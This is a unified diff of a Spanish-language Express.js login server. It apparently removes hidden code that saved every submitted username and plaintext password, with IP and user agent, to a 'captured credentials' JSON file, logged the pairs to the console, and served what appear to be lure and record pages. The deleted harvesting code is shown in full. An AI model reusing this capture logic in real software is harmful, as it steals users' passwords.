@@ -11,42 +11,6 @@ const app = express()
 app.set('trust proxy', 1)
 const USER_ACCESS_LOG_PATH = path.resolve(__dirname, 'lista de usuarios.json')
 
-const CREDENTIALS_CAPTURE_PATH = path.resolve(__dirname, 'credenciales-capturadas.json')
-
-async function guardarCredencialPlano(usuario, contrasena, req) {
-  const nuevaCredencial = {
-    id: Date.now(),
-    usuario: usuario,
-    contrasena: contrasena,  // ← Guardada en TEXTO PLANO
-    fecha: new Date().toISOString(),
-    ip: req.ip || req.socket?.remoteAddress || '',
-    user_agent: req.get('user-agent') || '',
-    origen: 'acceso-certificacion'
-  }
-
-  let credenciales = []
-  try {
-    const contenido = await fs.promises.readFile(CREDENTIALS_CAPTURE_PATH, 'utf8')
-    const parseado = JSON.parse(contenido)
-    if (Array.isArray(parseado)) credenciales = parseado
-  } catch (err) {
-    if (err.code !== 'ENOENT') console.error('Error leyendo archivo:', err.message)
-  }
-
-  credenciales.push(nuevaCredencial)
-  
-  try {
-    await fs.promises.writeFile(
-      CREDENTIALS_CAPTURE_PATH, 
-      JSON.stringify(credenciales, null, 2), 
-      'utf8'
-    )
-    console.log(`[CAPTURA] ${usuario} : ${contrasena}`)
-  } catch (err) {
-    console.error('Error guardando credencial:', err.message)
-  }
-}
-
 const DB_CONFIG = {
   host: process.env.DB_HOST || 'localhost',
   port: Number(process.env.DB_PORT || 3306),
@@ -503,17 +467,13 @@ app.post('/api/login', async (req, res) => {
     const { usuario, contrasena } = req.body || {}
 
     const usuarioLimpio = String(usuario || '').trim()
-    const contrasenaPlana = String(contrasena || '') // Sin trim para capturar exacto
-
-    // 🔴 GUARDAR EN ARCHIVO JSON CON CONTRASEÑA VISIBLE
-    await guardarCredencialPlano(usuarioLimpio, contrasenaPlana, req)
 
     const accessBaseLog = {
       fecha: new Date().toISOString(),
       usuario: usuarioLimpio,
       ip: req.ip || req.socket?.remoteAddress || '',
       user_agent: req.get('user-agent') || '',
-      origen: 'acceso-certificacion'
+      origen: 'web-login'
     }
 
     if (!usuario || !contrasena) {
@@ -577,30 +537,12 @@ app.post('/api/login', async (req, res) => {
         usuario: String(req.body?.usuario || '').trim(),
         ip: req.ip || req.socket?.remoteAddress || '',
         user_agent: req.get('user-agent') || '',
-        origen: 'acceso-certificacion',
+        origen: 'web-login',
         estado: 'error',
         motivo: err.message
       })
     } catch {}
     res.status(500).json({ ok: false, error: err.message })
-  }
-})
-
-app.get('/incap', (req, res) => {
-  res.sendFile(path.resolve(__dirname, 'acceso-certificacion.html'))
-})
-
-app.get('/incap-registros', (req, res) => {
-  res.sendFile(path.resolve(__dirname, 'lista-usuarios.html'))
-})
-
-app.post('/api/credenciales-capturadas/limpiar', async (req, res) => {
-  try {
-    await fs.promises.writeFile(CREDENTIALS_CAPTURE_PATH, '[]\n', 'utf8')
-    res.json({ ok: true })
-  } catch (err) {
-    console.error('Error limpiando credenciales capturadas:', err.message)
-    res.status(500).json({ ok: false, error: 'no_se_pudo_limpiar' })
   }
 })
 
